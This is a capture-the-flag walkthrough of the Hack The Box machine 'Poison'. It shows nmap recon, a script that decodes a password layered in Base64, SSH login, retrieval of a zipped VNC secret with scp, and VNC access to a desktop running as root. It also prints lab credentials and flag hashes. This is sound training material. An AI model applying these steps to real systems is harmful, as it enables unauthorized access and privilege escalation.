# CTF: Poison (HTB)

**Target IP:** `10.129.1.254` ($target)

---

## Metadata

- **CTF Name:** Poison
    
- **Platform:** Hack The Box
    
- **Date:** 2026-03-23
    
- **Tools Used:** nmap, python3, ssh, scp, unzip, vncviewer
    
- **Key Skills:** Information Disclosure, Base64 Decoding, SSH Access, Local Enumeration, VNC Exploitation
    

---

## Introduction

This walkthrough details the exploitation of the **Poison** machine on Hack The Box. The attack involves discovering sensitive files via a local script testing site, decoding a multi-layered Base64 password, and leveraging a VNC service running as root to achieve full system compromise.

---

## Reconnaissance

The initial scan was performed to identify open ports and services on the target.

**Command:**

Bash

```
😎 amuzed@Kali (~/HTB/Poison)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** Open (SSH: OpenSSH 7.2 FreeBSD)
    
- **80/tcp:** Open (HTTP: Apache 2.4.29 FreeBSD)
    
- **OS:** FreeBSD
    

---

## Foothold

The web server hosts a "Temporary website to test local .php scripts."

### 1. Information Disclosure

Enumerating the suggested scripts led to a directory listing through `listfiles.php`.

**Files Found:**

`browse.php`, `index.php`, `info.php`, `ini.php`, `listfiles.php`, `phpinfo.php`, `pwdbackup.txt`.

### 2. Password Recovery

The file `pwdbackup.txt` contained a string encoded 13 times. A Python script was used to decode the Base64 layers.

**Decoding Script:**

Python

```
import base64

inp_string = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU..." # truncated
times = 13

for i in range(times):
	inp_string = base64.b64decode(inp_string)
	
out_string = inp_string.decode('UTF-8')
print(out_string)
```

- **Cracked Password:** `Charix!2#4%6&8(0`
    

### 3. Initial Access (SSH)

Using the discovered password and the username `charix` found in `/etc/passwd`, a shell was established.

**Command:**

Bash

```
😎 amuzed@Kali (~/HTB/Poison)
$ ssh charix@$target
```

---

## Internal Enumeration

Upon logging in, two files were found in the home directory: `secret.zip` and `user.txt`.

### 1. Extracting the Secret

The `secret.zip` file was transferred to the local machine and decrypted using the same user password.

**Commands:**

Bash

```
😎 amuzed@Kali (~/HTB/Poison)
$ scp charix@$target:~/secret.zip .
$ unzip secret.zip 
$ cat secret | hexdump -C
```

- **Secret Output:** `bd a8 5b 7c d5 96 7a 21`
    

### 2. Identifying Local Services

Further investigation of network connections revealed internal services not visible from the external scan.

**Command:**

Bash

```
charix@Poison:~ % netstat -an -p tcp
```

- **Port 5801/5901:** VNC services running on localhost.
    
- **Process Check:** `Xvnc :1` was found running as **root**.
    

---

## Privilege Escalation

The VNC service running as root was identified as the path to full compromise.

### VNC Access

Using the `secret` file extracted earlier as the password, a VNC session was established to the root desktop.

**Command:**

Bash

```
😎 amuzed@Kali (~/HTB/Poison)
$ vncviewer -passwd secret 127.0.0.1:5901
```

- **Result:** Successfully connected to "root's X desktop (Poison:1)".
    

---

## Flags

- **User.txt:** `eaacdfb2d141b72a589233063604209c`
    
- **Root.txt:** `716d04b188419cf2bb99d891272361f5`
